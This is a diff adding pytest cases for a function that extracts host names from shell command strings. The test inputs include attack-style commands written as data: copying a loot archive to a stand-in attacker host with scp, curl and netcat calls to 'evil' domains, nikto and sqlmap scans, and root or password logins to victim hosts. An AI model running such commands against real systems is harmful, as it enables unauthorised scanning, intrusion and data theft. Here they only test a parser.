@@ -136,3 +136,102 @@ def test_the_list_of_endings_is_the_one_the_internet_has():
     assert {"com", "org", "io", "dev", "app", "uk", "ph"} <= resolve.TLDS and len(resolve.TLDS) > 1000
     assert not {"png", "pdf", "keys", "http", "service", "sqlite", "prototype"} & resolve.TLDS
     assert {"local", "internal", "lan", "test", "htb", "onion"} <= resolve.PRIVATE_ENDINGS
+
+
+# ---- after the first fix: what was still taken for a host, and what was still missed
+
+@pytest.mark.parametrize("command", [
+    "cat main.abc123.js.map | jq .sources",                                  # a source map
+    "unwebpack-sourcemap main.js.map out",
+    "javac Main.java && java Main.java",
+    "ffmpeg -i clip.mov -vn out.mp3",
+])
+def test_a_file_ending_that_is_a_top_level_domain_too_is_no_host(command):
+    assert hosts(command) == set()
+
+
+@pytest.mark.parametrize("command, found", [
+    ("cat out/config.dev", set()),
+    ("./nikto.pl -h target.pl", {"target.pl"}),
+    ("perl tools/nikto.pl -h target.pl", {"target.pl"}),
+    ("ls ~/loot/acme.dev /tmp/acme.app", set()),
+    ("curl evil.com/login.app", {"evil.com"}),                              # the host of a path is one, the file behind it is not
+    ("wget shop.acme.dev/static/app.page -O /tmp/app.page", {"shop.acme.dev"}),
+    ("smbclient //files.corp.example/share -U guest", {"files.corp.example"}),        # two slashes: the host of a share
+    ("curl //cdn.acme.dev/x.js", {"cdn.acme.dev"}),
+    ("sed -i 's/old.acme.io/new.acme.io/' hosts.txt", {"old.acme.io", "new.acme.io"}),  # in a quoted text / is the text's own
+])
+def test_what_stands_behind_a_slash_is_part_of_a_path(command, found):
+    assert hosts(command) == found
+
+
+@pytest.mark.parametrize("command, found", [
+    ("echo hi > out.dev", set()),
+    ("nmap target.dev >> scan.app 2> errors.dev", {"target.dev"}),
+    ("sort < names.data", set()),
+    ("tee>out.dev", set()),
+    ("nc -v <<< evil.dev", {"evil.dev"}),                                    # a here-string is what the program reads, not a file
+    ("curl -d '<host>evil.dev</host>' https://shop.acme.test/api", {"evil.dev", "shop.acme.test"}),     # in a quoted text > writes nowhere
+    ('echo "x > y.dev"', {"y.dev"}),
+])
+def test_what_a_command_writes_to_or_reads_from_is_a_file(command, found):
+    assert hosts(command) == found
+
+
+@pytest.mark.parametrize("command, found", [
+    ("perl nikto.pl -h target.pl", {"target.pl"}),
+    ("sudo perl -w nikto.pl", set()),
+    ("ruby scan.dev victim.io", {"victim.io"}),
+    ("bash deploy.app staging.app", {"staging.app"}),
+    ("node build.prod && curl api.acme.dev", {"api.acme.dev"}),
+    ("perl -e 'print 1' host.pl", {"host.pl"}),                              # behind a program in quotes: what that program is given
+    ("echo perl; curl target.pl", {"target.pl"}),                            # another command
+    ("curl target.pl | perl", {"target.pl"}),
+    ("node --inspect=dbg.acme.dev:9229 app.js", {"dbg.acme.dev"}),
+    ('bash -c "perl nikto.pl -h target.pl"', {"target.pl"}),
+])
+def test_the_file_an_interpreter_runs_is_no_host(command, found):
+    assert hosts(command) == found
+
+
+@pytest.mark.parametrize("command, found", [
+    ("ssh root@victim.pl", {"victim.pl"}),
+    ("ssh -i key.pem -p 2222 deploy@bastion.acme.dev 'uname -a'", {"bastion.acme.dev"}),
+    ("scp loot.zip user@drop.evil.pl:/tmp/", {"drop.evil.pl"}),
+    ("rsync -av ./site/ www@web01.acme.io:/var/www/", {"web01.acme.io"}),
+    ("sftp backup@files.acme.dev", {"files.acme.dev"}),
+    ("proxychains4 -q ssh ops@jump.corp.example", {"jump.corp.example"}),
+    ("autossh -M 0 -N tunnel@relay.acme.dev", {"relay.acme.dev"}),
+    ("sshpass -p hunter2 ssh admin@db7.prod-cluster", {"db7.prod-cluster"}),          # no ending of the internet: logged into, so a host
+    ("bash -c 'ssh root@victim.pl id'", {"victim.pl"}),
+    ("git clone git@github.com:foo/bar.git", {"github.com"}),
+    ("cd repo && git remote add up git@gitlab.acme.dev:team/app.git", {"gitlab.acme.dev"}),
+])
+def test_the_host_a_command_logs_into_is_found_behind_the_user_name(command, found):
+    assert hosts(command) == found
+
+
+@pytest.mark.parametrize("command, found", [
+    ("git config --global user.name Dave && git config core.editor vim", set()),
+    ("git -c user.name=Dave -c user.email=d@x.io commit -m x", set()),
+    ("java -Dhttp.proxyHost=proxy.evil.dev -Dfile.encoding=UTF-8 -jar app.jar", {"proxy.evil.dev"}),     # the value is looked at
+    ("git config http.proxy proxy.corp.example:8080", {"proxy.corp.example"}),
+    ("helm upgrade app ./chart --set image.tag=1.2 --set ingress.host=shop.acme.dev", {"shop.acme.dev"}),
+])
+def test_the_name_of_a_setting_is_no_host(command, found):
+    assert hosts(command) == found
+
+
+@pytest.mark.parametrize("command, found", [
+    ("git config user.email dave@yahoo.com", set()),
+    ("ssh root@victim.pl id; git config user.email dave@yahoo.com", {"victim.pl"}),      # the next command logs in nowhere
+    ("git commit --author 'Dave <dave@yahoo.com>' -m fix", set()),
+    ("curl -u dave@yahoo.com:hunter2 https://shop.acme.test/login", {"shop.acme.test"}),
+    ("sqlmap -u 'https://shop.acme.test/?id=1' --data 'email=a@b.com' --batch", {"shop.acme.test"}),
+    ("echo 'contact: security@acme.com' >> notes.md", set()),
+    ("ssh-keygen -t ed25519 -C dave@yahoo.com", set()),
+    ("grep -r ~/.ssh -e dave@yahoo.com", set()),                             # the folder is not the command
+    ("curl https://shop.acme.test/ -H 'X-Mail: a@b.com'; ssh root@victim.pl", {"shop.acme.test", "victim.pl"}),
+])
+def test_an_email_address_is_no_host(command, found):
+    assert hosts(command) == found
